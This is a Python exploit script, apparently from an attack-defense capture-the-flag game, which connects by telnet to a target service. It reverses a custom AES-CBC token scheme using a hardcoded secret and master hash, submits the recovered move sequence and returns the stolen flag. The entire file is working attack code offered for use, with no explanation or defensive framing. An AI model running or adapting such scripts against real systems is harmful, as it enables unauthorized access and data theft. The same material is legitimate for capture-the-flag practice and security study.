import re
import random
import string
import hashlib
from Crypto.Cipher import AES
import telnetlib

class Exploit():

  master_hash = str(bytearray([80, 67, 14, 211, 155, 40, 218, 226, 90, 162, 233, 139, 75, 145, 7, 181]))
  secret = 'PRENEELAPPROVESMAYBE'
  flag = ''

  def unpack_moves( self, in_buffer ):
    out_buffer = ''
    for i in range(0, len(in_buffer)):
      value = ord(in_buffer[i])
      for j in range(0, 4):
        chr = '?'
        n = ((value >> j*2) & 3)
        if n == 0:
          chr = 'w'
        elif n== 1:
          chr = 'n'
        elif n == 2:
          chr = 's'
        elif  n== 3:
          chr = 'e'
        out_buffer += chr;
    return out_buffer
  
  def dohash_inverse_16( self, in_buffer ):
    iv = hashlib.sha1(self.secret).digest()[0:16]
    key = iv
    cipher = AES.new( key, AES.MODE_CBC, iv )
    return cipher.decrypt( in_buffer )[0:16]
    
  def dohash_inverse_32( self, in_buffer ):
    iv = hashlib.sha1(self.secret).digest()[0:16]
    key = iv
    iv_null = '\x00'*16
    cipher1 = AES.new( key, AES.MODE_CBC, iv_null )
    cipher2 = AES.new( key, AES.MODE_CBC, iv )
    tmp = cipher1.decrypt( in_buffer[0:16] )[0:16]
    cypher_block1 = ''
    plain_block2 = chr(85)*16 #85:nnnn packed
    for x in range(0, 16):
      cypher_block1 += chr( ord(tmp[x]) ^ ord(plain_block2[x]) );
    return cipher2.decrypt( cypher_block1 )[0:16] + plain_block2
  
  def create_forward_secure_tokens_inverse( self, in_buffer, epoch ):
    buff = in_buffer[0:16]
    for x in range(1, epoch):
      buff = self.dohash_inverse_16(buff)
    buff = self.dohash_inverse_32(buff);
    return buff

  def execute(self, ip, port, flag_id):
    tn = telnetlib.Telnet(ip, port)
    epoch = tn.read_until('Insert Username: ')
    m = re.search('Your epoch is: ([0-9]+)\.', epoch)
    epoch = int(m.group(1))
    packed = self.create_forward_secure_tokens_inverse(self.master_hash, epoch)
    buff = self.unpack_moves(packed)
    #print buff
    tn.write( ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '\n' )
    tn.write( 'anything\n'  )
    tn.write( 'anything\n'  )
    tn.write( 'p\n'  )
    tn.write( "".join( buff[x] + '\n' for x in range(0,128) ) )
    tn.write( flag_id + '\n' )
    flag = tn.read_all()
    flag = flag[flag.rfind('\n?>')+3:]
    self.flag = flag
    #print flag

  def result(self):
    return {'FLAG' : self.flag}
		

 